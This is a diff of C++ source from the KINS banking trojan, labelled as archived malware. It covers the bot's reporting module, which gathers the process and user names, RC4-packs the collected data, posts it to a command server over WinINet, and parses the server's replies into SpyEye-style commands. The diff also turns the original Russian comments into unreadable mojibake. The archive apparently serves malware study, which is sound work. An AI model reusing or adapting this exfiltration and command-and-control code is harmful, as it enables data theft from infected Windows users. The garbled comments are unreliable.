@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <security.h>
 #include <accctrl.h>
@@ -27,19 +38,19 @@
 
 static DWORD threadResult;
 
-//Общая струкура для работы с сервером.
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef struct
 {
 	LPSTR serverUrl;							//Server URL, used with insta-sender.
 	BinStorage::STORAGE *binOutgoingStorage;	//Storage to send
 }SENDERDATA;
 
-//Внутриннии данные для XSender.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ XSender.
 enum 
 {
-	DSR_SENDED,    //Отчет отправлен.
-	DSR_WAIT_DATA, //Ожидание данных.
-	DSR_ERROR      //Ошибка при отравки.
+	DSR_SENDED,    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	DSR_WAIT_DATA, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	DSR_ERROR      //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 };
 
 void Report::init(void)
@@ -122,14 +133,14 @@ bool Report::addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags)
 
 		if((size = CWA(kernel32, GetModuleFileNameW)(NULL, file, MAX_PATH - 1)) > 0)
 		{
-			file[size] = 0; //На всякий случай.
+			file[size] = 0; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 			r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_NAME, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
 		}
 
 		size = sizeof(file) / sizeof(WCHAR);
 		if(r && CWA(secur32, GetUserNameExW)(NameSamCompatible, file, &size) != FALSE && size > 0)
 		{
-			file[size] = 0; //На всякий случай.
+			file[size] = 0; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 			r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_USER, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
 		}
 	}
@@ -168,7 +179,7 @@ static int defaultSenderResultProc(DWORD loop, Report::SERVERSESSION *session)
 			while(curItem = BinStorage::_getNextItem(session->postData, curItem))
 			{
 				if(!id) id=curItem->id; //first iteration.
-				else if(id != curItem->id) //Мы можем так поступить потому что сервер будет отсылать данные каждой комманды по очереди.
+				else if(id != curItem->id) //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				{
 					currentCmd->next = (SpyEye_Modules::COMMAND_LIST*)Mem::alloc(sizeof(SpyEye_Modules::COMMAND_LIST));
 					if(!currentCmd->next) {WDEBUG0(WDDT_ERROR, "M#3");break;}
@@ -221,7 +232,7 @@ static int __inline sendRequest(HttpTools::URLDATA *ud, HINTERNET serverHandle, 
 			result = procRetCode;
 		else if(session->postData != NULL && (size = BinStorage::_pack(&session->postData, BinStorage::PACKF_FINAL_MODE, (Crypt::RC4KEY *)session->rc4Key)) > 0)
 		{
-			//Отправляем запрос.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 			DWORD requestFlags = Wininet::WISRF_METHOD_POST | Wininet::WISRF_KEEP_CONNECTION;
 			if(ud->scheme == HttpTools::UDS_HTTPS)
 				requestFlags |= Wininet::WISRF_IS_HTTPS;
@@ -229,11 +240,11 @@ static int __inline sendRequest(HttpTools::URLDATA *ud, HINTERNET serverHandle, 
 			HINTERNET requestHandle = Wininet::_SendRequest(serverHandle, ud->uri, NULL, session->postData, size, requestFlags);
 			if(requestHandle != NULL)
 			{
-				//Получаем ответ.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 				MEMDATA md;
 				if(Wininet::_DownloadData(requestHandle, &md, 0, session->stopEvent))
 				{
-					//Распаковывем ответ.
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 					size = BinStorage::_unpack(NULL, md.data, md.size, (Crypt::RC4KEY *)session->rc4Key);
 					
 					Mem::free(session->postData);
@@ -257,16 +268,16 @@ bool Report::startServerSession(SERVERSESSION *session)
 
 	bool retVal = false;
 	HttpTools::URLDATA ud;
-	BinStorage::STORAGE *originalPostData = session->postData; //Сохраняем оригинальные пост-данные.
+	BinStorage::STORAGE *originalPostData = session->postData; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
 
 	if(HttpTools::_parseUrl(session->url, &ud))
 	{
 		DllCore::initHttpUserAgent();
 
-		//Цикл повтора подключений к серверу в случаи обрыва или недоступности.
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		for(BYTE bi = 0; bi < WININET_CONNECT_RETRY_COUNT && retVal == false; bi++)
 		{
-			//Задержка.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(bi > 0)
 			{
 				if(session->stopEvent != NULL)
@@ -278,7 +289,7 @@ bool Report::startServerSession(SERVERSESSION *session)
 					CWA(kernel32, Sleep)(WININET_CONNECT_RETRY_DELAY);
 			}
 
-			//Создаем хэндл сервера.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			HINTERNET serverHandle = Wininet::_Connect(coreDllData.httpUserAgent, ud.host, ud.port, bi % 2 == 0 ? Wininet::WICF_USE_IE_PROXY : 0);
 			if(serverHandle != NULL)
 			{
@@ -299,7 +310,7 @@ bool Report::startServerSession(SERVERSESSION *session)
 		HttpTools::_freeUrlData(&ud);
 	}
 
-	session->postData = originalPostData; //Восстанавливаем оригинальные пост-данные.
+	session->postData = originalPostData; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
 	return retVal;
 }
 
